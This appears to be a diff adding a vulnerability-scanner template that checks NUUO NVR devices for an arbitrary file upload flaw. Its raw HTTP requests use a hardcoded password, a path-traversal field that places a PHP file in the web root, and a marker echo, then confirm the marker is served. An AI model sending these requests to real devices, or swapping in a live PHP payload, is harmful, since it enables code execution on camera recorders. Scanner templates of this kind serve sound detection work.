@@ -1,0 +1,49 @@
+id: nuuo-nvr-oemupload-uploadfile
+
+info:
+  name: nuuo-nvr-oemupload-uploadfile
+  author: HuanXiong
+  severity: high
+
+  tags: File Upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}"
+
+http:
+  - raw:
+      - |
+        POST /oemupload.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYrqVrkjRl2AHEKXG 
+        Content-Length: 428
+
+        ------WebKitFormBoundaryYrqVrkjRl2AHEKXG
+        Content-Disposition: form-data; name="pwd"
+
+        nvrmini2260
+        ------WebKitFormBoundaryYrqVrkjRl2AHEKXG
+        Content-Disposition: form-data; name="url"
+
+        /../../../../../../NUUO/web/{{username}}.php
+        ------WebKitFormBoundaryYrqVrkjRl2AHEKXG
+        Content-Disposition: form-data; name="file"; filename="{{username}}.php"
+        Content-Type: audio/mp3
+
+        <?php echo 'djwaodw';?>
+        ------WebKitFormBoundaryYrqVrkjRl2AHEKXG--
+
+      - |
+        GET /{{username}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        accept: */*
+
+    matchers:
+      - type: dsl
+        name: fileupload
+        dsl:
+          - "status_code_2 == 200 && contains(body,'djwaodw')"
